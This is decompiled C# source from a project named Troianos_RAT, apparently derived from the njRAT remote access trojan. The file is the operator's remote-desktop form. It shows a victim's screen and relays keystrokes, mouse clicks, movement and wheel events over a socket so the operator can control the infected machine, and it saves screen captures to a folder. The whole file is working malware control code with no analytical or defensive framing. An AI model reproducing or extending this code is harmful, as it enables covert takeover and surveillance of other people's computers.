using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.My.Resources;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT
{
	// Token: 0x0200001D RID: 29
	[DesignerGenerated]
	public partial class sc : Form
	{
		// Token: 0x06000331 RID: 817 RVA: 0x001F626C File Offset: 0x001F466C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = sc.__ENCList;
			lock (_ENCList)
			{
				bool flag = sc.__ENCList.Count == sc.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = sc.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = sc.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								sc.__ENCList[num] = sc.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					sc.__ENCList.RemoveRange(num, sc.__ENCList.Count - num);
					sc.__ENCList.Capacity = sc.__ENCList.Count;
				}
				sc.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700010B RID: 267
		// (get) Token: 0x06000334 RID: 820 RVA: 0x001F6C80 File Offset: 0x001F5080
		// (set) Token: 0x06000335 RID: 821 RVA: 0x001F6C98 File Offset: 0x001F5098
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x1700010C RID: 268
		// (get) Token: 0x06000336 RID: 822 RVA: 0x001F6CA4 File Offset: 0x001F50A4
		// (set) Token: 0x06000337 RID: 823 RVA: 0x001F6CBC File Offset: 0x001F50BC
		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		// Token: 0x1700010D RID: 269
		// (get) Token: 0x06000338 RID: 824 RVA: 0x001F6CC8 File Offset: 0x001F50C8
		// (set) Token: 0x06000339 RID: 825 RVA: 0x001F6CE0 File Offset: 0x001F50E0
		internal virtual CheckBox CheckBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox2 = value;
			}
		}

		// Token: 0x1700010E RID: 270
		// (get) Token: 0x0600033A RID: 826 RVA: 0x001F6CEC File Offset: 0x001F50EC
		// (set) Token: 0x0600033B RID: 827 RVA: 0x001F6D04 File Offset: 0x001F5104
		internal virtual CheckBox CheckBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CheckBox3_CheckedChanged);
				bool flag = this._CheckBox3 != null;
				if (flag)
				{
					this._CheckBox3.CheckedChanged -= value2;
				}
				this._CheckBox3 = value;
				flag = (this._CheckBox3 != null);
				if (flag)
				{
					this._CheckBox3.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x1700010F RID: 271
		// (get) Token: 0x0600033C RID: 828 RVA: 0x001F6D64 File Offset: 0x001F5164
		// (set) Token: 0x0600033D RID: 829 RVA: 0x001F6D7C File Offset: 0x001F517C
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x17000110 RID: 272
		// (get) Token: 0x0600033E RID: 830 RVA: 0x001F6D88 File Offset: 0x001F5188
		// (set) Token: 0x0600033F RID: 831 RVA: 0x001F6DA0 File Offset: 0x001F51A0
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000111 RID: 273
		// (get) Token: 0x06000340 RID: 832 RVA: 0x001F6E00 File Offset: 0x001F5200
		// (set) Token: 0x06000341 RID: 833 RVA: 0x001F6E18 File Offset: 0x001F5218
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x17000112 RID: 274
		// (get) Token: 0x06000342 RID: 834 RVA: 0x001F6E24 File Offset: 0x001F5224
		// (set) Token: 0x06000343 RID: 835 RVA: 0x001F6E3C File Offset: 0x001F523C
		internal virtual Timer vmethod_16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.vmethod_16_Tick);
				bool flag = this._vmethod_16 != null;
				if (flag)
				{
					this._vmethod_16.Tick -= value2;
				}
				this._vmethod_16 = value;
				flag = (this._vmethod_16 != null);
				if (flag)
				{
					this._vmethod_16.Tick += value2;
				}
			}
		}

		// Token: 0x17000113 RID: 275
		// (get) Token: 0x06000344 RID: 836 RVA: 0x001F6E9C File Offset: 0x001F529C
		// (set) Token: 0x06000345 RID: 837 RVA: 0x001F6EB4 File Offset: 0x001F52B4
		internal virtual Timer vmethod_12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.vmethod_12_Tick);
				bool flag = this._vmethod_12 != null;
				if (flag)
				{
					this._vmethod_12.Tick -= value2;
				}
				this._vmethod_12 = value;
				flag = (this._vmethod_12 != null);
				if (flag)
				{
					this._vmethod_12.Tick += value2;
				}
			}
		}

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x06000346 RID: 838 RVA: 0x001F6F14 File Offset: 0x001F5314
		// (set) Token: 0x06000347 RID: 839 RVA: 0x001F6F2C File Offset: 0x001F532C
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x06000348 RID: 840 RVA: 0x001F6F38 File Offset: 0x001F5338
		// (set) Token: 0x06000349 RID: 841 RVA: 0x001F6F50 File Offset: 0x001F5350
		internal virtual PictureBox p
		{
			[DebuggerNonUserCode]
			get
			{
				return this._p;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler value2 = new MouseEventHandler(this.p_MouseDown);
				EventHandler value3 = new EventHandler(this.p_Resize);
				PaintEventHandler value4 = new PaintEventHandler(this.p_Paint);
				MouseEventHandler value5 = new MouseEventHandler(this.p_MouseWheel);
				MouseEventHandler value6 = new MouseEventHandler(this.p_MouseUp);
				MouseEventHandler value7 = new MouseEventHandler(this.p_MouseMove);
				EventHandler value8 = new EventHandler(this.p_MouseLeave);
				EventHandler value9 = new EventHandler(this.p_MouseEnter);
				bool flag = this._p != null;
				if (flag)
				{
					this._p.MouseDown -= value2;
					this._p.Resize -= value3;
					this._p.Paint -= value4;
					this._p.MouseWheel -= value5;
					this._p.MouseUp -= value6;
					this._p.MouseMove -= value7;
					this._p.MouseLeave -= value8;
					this._p.MouseEnter -= value9;
				}
				this._p = value;
				flag = (this._p != null);
				if (flag)
				{
					this._p.MouseDown += value2;
					this._p.Resize += value3;
					this._p.Paint += value4;
					this._p.MouseWheel += value5;
					this._p.MouseUp += value6;
					this._p.MouseMove += value7;
					this._p.MouseLeave += value8;
					this._p.MouseEnter += value9;
				}
			}
		}

		// Token: 0x17000116 RID: 278
		// (get) Token: 0x0600034A RID: 842 RVA: 0x001F70D8 File Offset: 0x001F54D8
		// (set) Token: 0x0600034B RID: 843 RVA: 0x001F70F0 File Offset: 0x001F54F0
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x0600034C RID: 844 RVA: 0x001F7150 File Offset: 0x001F5550
		public sc()
		{
			base.FormClosing += this.sc_FormClosing;
			base.Load += this.sc_Load;
			base.ResizeBegin += this.sc_ResizeBegin;
			base.ResizeEnd += this.sc_ResizeEnd;
			sc.__ENCAddToList(this);
			this.QQ = string.Empty;
			this.Oimg = null;
			this.point_0 = default(Point);
			this.point_1 = default(Point);
			this.co = 0;
			this.Folder = string.Empty;
			this.point_2 = new Point(30, 30);
			this.IsActive = false;
			this.fps = 0;
			this.int_0 = 0;
			this.dbf = 0L;
			this.InitializeComponent();
		}

		// Token: 0x0600034D RID: 845 RVA: 0x001F7230 File Offset: 0x001F5630
		public void KDW(object sender, KeyEventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Iniciar", false) == 0;
			if (!flag)
			{
				this.p.Focus();
				flag = this.CheckBox2.Checked;
				if (flag)
				{
					Keys keyCode = e.KeyCode;
					bool flag2;
					if (keyCode != Keys.Shift && keyCode != Keys.ShiftKey)
					{
						if (keyCode != Keys.LShiftKey)
						{
							if (keyCode != Keys.RShiftKey)
							{
								flag2 = false;
								goto IL_71;
							}
						}
					}
					flag2 = true;
					IL_71:
					bool flag3 = flag2;
					if (flag3)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(0),
							Class7.string_1,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(0),
							Class7.string_1,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
				e.SuppressKeyPress = true;
			}
		}

		// Token: 0x0600034E RID: 846 RVA: 0x001F7358 File Offset: 0x001F5758
		public void KUP(object sender, KeyEventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
			if (!flag)
			{
				this.p.Focus();
				flag = this.CheckBox2.Checked;
				if (flag)
				{
					Keys keyCode = e.KeyCode;
					bool flag2;
					if (keyCode != Keys.Shift && keyCode != Keys.ShiftKey)
					{
						if (keyCode != Keys.LShiftKey)
						{
							if (keyCode != Keys.RShiftKey)
							{
								flag2 = false;
								goto IL_71;
							}
						}
					}
					flag2 = true;
					IL_71:
					bool flag3 = flag2;
					if (flag3)
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(2),
							Class7.string_1,
							Conversions.ToString(16)
						}));
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"#",
							Class7.string_1,
							Conversions.ToString(2),
							Class7.string_1,
							Conversions.ToString((int)e.KeyCode)
						}));
					}
				}
				e.SuppressKeyPress = true;
			}
		}

		// Token: 0x0600034F RID: 847 RVA: 0x001F7480 File Offset: 0x001F5880
		private void p_MouseDown(object sender, MouseEventArgs e)
		{
			PictureBox p = this.p;
			PictureBox obj = p;
			lock (obj)
			{
				bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Iniciar", false) != 0;
				if (flag)
				{
					Point point = new Point((int)Math.Round(Math.Round((double)e.X * ((double)this.sz.Width / (double)this.p.Width))), (int)Math.Round(Math.Round((double)e.Y * ((double)this.sz.Height / (double)this.p.Height))));
					flag = (e.Button == MouseButtons.Left);
					int value;
					if (flag)
					{
						value = 2;
					}
					flag = (e.Button == MouseButtons.Right);
					if (flag)
					{
						value = 8;
					}
					this.sk.Send(string.Concat(new string[]
					{
						"@",
						Class7.string_1,
						Conversions.ToString(point.X),
						Class7.string_1,
						Conversions.ToString(point.Y),
						Class7.string_1,
						Conversions.ToString(value)
					}));
				}
			}
		}

		// Token: 0x06000350 RID: 848 RVA: 0x001F75FC File Offset: 0x001F59FC
		private void p_MouseEnter(object sender, EventArgs e)
		{
			this.IsActive = true;
		}

		// Token: 0x06000351 RID: 849 RVA: 0x001F7608 File Offset: 0x001F5A08
		private void p_MouseLeave(object sender, EventArgs e)
		{
			this.IsActive = false;
		}

		// Token: 0x06000352 RID: 850 RVA: 0x001F7614 File Offset: 0x001F5A14
		private void p_MouseMove(object sender, MouseEventArgs e)
		{
			this.point_2 = e.Location;
			bool flag = this.point_2.Y < 20;
			if (flag)
			{
				this.Button2.Visible = true;
			}
			else
			{
				this.Button2.Visible = false;
			}
			PictureBox p = this.p;
			PictureBox obj = p;
			lock (obj)
			{
				flag = ((!this.p.Focused & this.CheckBox2.Checked) | this.CheckBox1.Checked);
				if (flag)
				{
					this.p.Focus();
				}
			}
		}

		// Token: 0x06000353 RID: 851 RVA: 0x001F76C4 File Offset: 0x001F5AC4
		private void p_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Iniciar", false) != 0;
			if (flag)
			{
				Point point = new Point((int)Math.Round(Math.Round((double)e.X * ((double)this.sz.Width / (double)this.p.Width))), (int)Math.Round(Math.Round((double)e.Y * ((double)this.sz.Height / (double)this.p.Height))));
				flag = (e.Button == MouseButtons.Left);
				int value;
				if (flag)
				{
					value = 4;
				}
				flag = (e.Button == MouseButtons.Right);
				if (flag)
				{
					value = 16;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"@",
					Class7.string_1,
					Conversions.ToString(point.X),
					Class7.string_1,
					Conversions.ToString(point.Y),
					Class7.string_1,
					Conversions.ToString(value)
				}));
			}
		}

		// Token: 0x06000354 RID: 852 RVA: 0x001F77F8 File Offset: 0x001F5BF8
		private void p_MouseWheel(object sender, MouseEventArgs e)
		{
			PictureBox p = this.p;
			PictureBox obj = p;
			lock (obj)
			{
				bool flag = this.CheckBox1.Checked && Operators.CompareString(this.Button1.Text, "Iniciar", false) != 0;
				if (flag)
				{
					this.sk.Send(string.Concat(new string[]
					{
						"@",
						Class7.string_1,
						Conversions.ToString(e.Delta),
						Class7.string_1,
						Conversions.ToString(this.point_1.Y),
						Class7.string_1,
						Conversions.ToString(2048)
					}));
				}
			}
		}

		// Token: 0x06000355 RID: 853 RVA: 0x001F78D4 File Offset: 0x001F5CD4
		private void p_Paint(object sender, PaintEventArgs e)
		{
			string text = Conversions.ToString(this.int_0) + " FPS\r\n" + Class6.smethod_17(this.pkt);
			Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
			bool flag = !(this.point_2.X < size.Width & this.point_2.Y < size.Height);
			if (flag)
			{
				Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
				e.Graphics.FillRectangle(new Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect);
				Brush brush = Brushes.White;
				flag = (this.int_0 > 3);
				if (flag)
				{
					brush = Brushes.White;
				}
				flag = (this.int_0 > 6);
				if (flag)
				{
					brush = Brushes.Lime;
				}
				e.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush, 0f, 0f);
			}
		}

		// Token: 0x06000356 RID: 854 RVA: 0x001F79DC File Offset: 0x001F5DDC
		private void p_Resize(object sender, EventArgs e)
		{
			this.Button2.Left = (int)Math.Round(Math.Round((double)this.p.Width / 2.0 - (double)this.Button2.Width / 2.0));
			this.Button2.Top = this.p.Top + 3;
		}

		// Token: 0x06000357 RID: 855 RVA: 0x001F7A4C File Offset: 0x001F5E4C
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Parar", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Iniciar";
				this.sk.Send("!!");
				this.ComboBox1.Enabled = true;
			}
			else
			{
				this.ComboBox1.Enabled = false;
				this.Button1.Text = "Parar";
				float num = (float)(Conversions.ToDouble(this.ComboBox1.Text.Remove(0, 1)) / 100.0);
				Size size = new Size((int)Math.Round(Math.Round((double)((float)this.sz.Width * num / 10f))) * 10, (int)Math.Round(Math.Round((double)((float)this.sz.Height * num / 10f))) * 10);
				this.sk.Send(string.Concat(new string[]
				{
					"!",
					Class7.string_1,
					this.sk.ip(),
					Class7.string_1,
					Conversions.ToString(size.Width),
					"x",
					Conversions.ToString(size.Height),
					Class7.string_1,
					"0"
				}));
			}
		}

		// Token: 0x06000358 RID: 856 RVA: 0x001F7BBC File Offset: 0x001F5FBC
		private void vmethod_16_Tick(object sender, EventArgs e)
		{
			this.vmethod_12.Enabled = false;
			bool flag = !this.osk.CN | !this.sk.CN;
			if (flag)
			{
				this.sk.CN = false;
				this.Panel1.Enabled = false;
				this.Text = "Desconectado!!" + this.QQ;
				this.Close();
			}
			else
			{
				this.int_0 = this.fps;
				this.fps = 0;
				flag = (this.int_0 == 0);
				if (flag)
				{
					this.pkt = 0L;
					this.p.Invalidate();
				}
				this.vmethod_12.Enabled = true;
			}
		}

		// Token: 0x06000359 RID: 857 RVA: 0x001F7C78 File Offset: 0x001F6078
		private void vmethod_12_Tick(object sender, EventArgs e)
		{
			this.ProgressBar1.Value = this.sk.rp();
			Point point = this.PointToClient(Cursor.Position);
			bool flag = point.X > -1 & point.Y > -1 & this.IsActive;
			if (flag)
			{
				this.point_0 = new Point((int)Math.Round(Math.Round((double)point.X * ((double)this.sz.Width / (double)this.p.Width))), (int)Math.Round(Math.Round((double)point.Y * ((double)this.sz.Height / (double)this.p.Height))));
				flag = ((this.CheckBox1.Checked & Operators.CompareString(this.Button1.Text, "Iniciar", false) != 0) && this.point_0 != this.point_1);
				if (flag)
				{
					this.point_1 = this.point_0;
					Client client = this.sk;
					string text = string.Concat(new string[]
					{
						"@",
						Class7.string_1,
						Conversions.ToString(this.point_1.X),
						Class7.string_1,
						Conversions.ToString(this.point_1.Y),
						Class7.string_1,
						Conversions.ToString(1)
					});
					client.SEND_(Class6.smethod_11(ref text));
				}
			}
		}

		// Token: 0x0600035A RID: 858 RVA: 0x001F7E04 File Offset: 0x001F6204
		private void sc_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool flag = this.sk != null;
			if (flag)
			{
				this.sk.CN = false;
			}
		}

		// Token: 0x0600035B RID: 859 RVA: 0x001F7E30 File Offset: 0x001F6230
		private void sc_Load(object sender, EventArgs e)
		{
			try
			{
				PictureBox p = this.p;
				PictureBox obj = p;
				lock (obj)
				{
					this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
					this.Text = this.QQ;
					Control p2 = this.p;
					p2.KeyUp += this.KUP;
					p2.KeyDown += this.KDW;
					this.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0);
				}
				this.Folder = this.osk.Folder + "Tela\\";
				bool flag = !Directory.Exists(this.Folder);
				if (flag)
				{
					Directory.CreateDirectory(this.Folder);
				}
				flag = Class7.class8_0.bool_6;
				if (flag)
				{
					this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				}
				flag = (Operators.CompareString(this.Button1.Text, "Iniciar", false) != 0);
				if (flag)
				{
					this.Button2_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				}
			}
			catch (Exception ex)
			{
				this.Close();
			}
		}

		// Token: 0x0600035C RID: 860 RVA: 0x001F7FC4 File Offset: 0x001F63C4
		private void sc_ResizeBegin(object sender, EventArgs e)
		{
			PictureBox p = this.p;
			PictureBox obj = p;
			lock (obj)
			{
			}
		}

		// Token: 0x0600035D RID: 861 RVA: 0x001F8000 File Offset: 0x001F6400
		private void sc_ResizeEnd(object sender, EventArgs e)
		{
			PictureBox p = this.p;
			PictureBox obj = p;
			lock (obj)
			{
			}
		}

		// Token: 0x0600035E RID: 862 RVA: 0x001F803C File Offset: 0x001F643C
		private void Button2_Click(object sender, EventArgs e)
		{
			bool flag = !this.Panel1.Visible;
			if (flag)
			{
				this.Panel1.Visible = true;
				this.Button2.BackgroundImage = Resources.bullet_arrow_up;
				this.ProgressBar1.Visible = true;
			}
			else
			{
				this.Panel1.Visible = false;
				this.Button2.BackgroundImage = Resources.bullet_arrow_down;
				this.ProgressBar1.Visible = false;
			}
		}

		// Token: 0x0600035F RID: 863 RVA: 0x001F80B8 File Offset: 0x001F64B8
		private void CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.CheckBox3.Checked;
			if (@checked)
			{
				try
				{
					Process.Start(this.Folder);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x04000185 RID: 389
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000187 RID: 391
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x04000188 RID: 392
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		// Token: 0x04000189 RID: 393
		[AccessedThroughProperty("CheckBox2")]
		private CheckBox _CheckBox2;

		// Token: 0x0400018A RID: 394
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox _CheckBox3;

		// Token: 0x0400018B RID: 395
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x0400018C RID: 396
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400018D RID: 397
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x0400018E RID: 398
		[AccessedThroughProperty("vmethod_16")]
		private Timer _vmethod_16;

		// Token: 0x0400018F RID: 399
		[AccessedThroughProperty("vmethod_12")]
		private Timer _vmethod_12;

		// Token: 0x04000190 RID: 400
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x04000191 RID: 401
		[AccessedThroughProperty("p")]
		private PictureBox _p;

		// Token: 0x04000192 RID: 402
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x04000193 RID: 403
		public int co;

		// Token: 0x04000194 RID: 404
		public long dbf;

		// Token: 0x04000195 RID: 405
		public string Folder;

		// Token: 0x04000196 RID: 406
		public int fps;

		// Token: 0x04000197 RID: 407
		private int int_0;

		// Token: 0x04000198 RID: 408
		public bool IsActive;

		// Token: 0x04000199 RID: 409
		public Bitmap Oimg;

		// Token: 0x0400019A RID: 410
		public Client osk;

		// Token: 0x0400019B RID: 411
		public long pkt;

		// Token: 0x0400019C RID: 412
		private Point point_0;

		// Token: 0x0400019D RID: 413
		private Point point_1;

		// Token: 0x0400019E RID: 414
		private Point point_2;

		// Token: 0x0400019F RID: 415
		public string QQ;

		// Token: 0x040001A0 RID: 416
		public Client sk;

		// Token: 0x040001A1 RID: 417
		public Size sz;
	}
}
